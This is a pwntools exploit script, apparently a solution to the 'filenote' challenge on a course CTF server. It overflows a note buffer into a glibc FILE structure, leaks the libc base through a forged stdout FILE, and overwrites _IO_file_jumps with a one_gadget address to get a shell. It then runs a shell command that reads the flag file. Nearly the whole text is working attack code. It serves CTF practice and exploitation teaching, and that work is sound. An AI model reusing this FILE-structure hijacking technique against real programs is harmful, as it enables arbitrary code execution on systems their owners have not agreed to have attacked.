from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]

HOST, PORT = 'edu-ctf.zoolab.org', 30218
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./filenote_release/filenote/chal')
libc = ELF('./filenote_release/libc.so.6')
libc.sym['one_gadget'] = 0xe6c84

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

def fake_file(
        flags = 0,
        read_ptr = 0, read_end = 0, read_base = 0,
        write_base = 0, write_ptr = 0, write_end = 0,
        buf_base = 0, buf_end = 0,
        fd = None,
    ):
    file = [
        flags, read_ptr,
        read_end, read_base,
        write_base, write_ptr,
        write_end, buf_base,
        buf_end
    ]
    if fd is not None:
        file += [0, 0, 0, 0, 0, fd]
    return flat(file)

def create():
    io.sendlineafter(b'>', b'1')
def write(payload):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', payload)
def save():
    io.sendlineafter(b'>', b'3')
def leave():
    io.sendlineafter(b'>', b'4')

create()

note_offset = 0x2a0
tmp_file_offset = 0x4b0
offset = tmp_file_offset - note_offset

write(b'A'*offset + fake_file(fd=1))
save()

flags = 0x1800
write(b'A'*offset + flat(flags,0,0,0))
while True:
    save()
    line = io.readline()
    if b'AA' in line:
        break
libc.address = u64(line[0x81:0x89]) - libc.sym._IO_wfile_jumps
info(f'libc base: {hex(libc.address)}')
info(f'one_gadget: {hex(libc.sym.one_gadget)}')
info(f'_IO_file_jumps: {hex(libc.sym._IO_file_jumps)}')

# _IO_file_setbuf
# https://sourcegraph.com/github.com/bminor/glibc@refs/heads/release/2.31/master/-/blob/libio/genops.c?L824
st = 11
sz = 1
buf_base = libc.sym._IO_file_jumps + 0x8 * st
file = fake_file(
    write_ptr = buf_base,
    write_end = buf_base + 8*sz,
)
write(p64(libc.sym.one_gadget)*(offset//8) + file)
save()
leave()

if not args.REMOTE:
    io.clean(0.1)
    io.interactive()
else:
    io.clean(1)
    io.sendline(b'cat /home/`whoami`/flag*')
    flag = io.readuntil(b'}').strip().decode()
    success(flag)
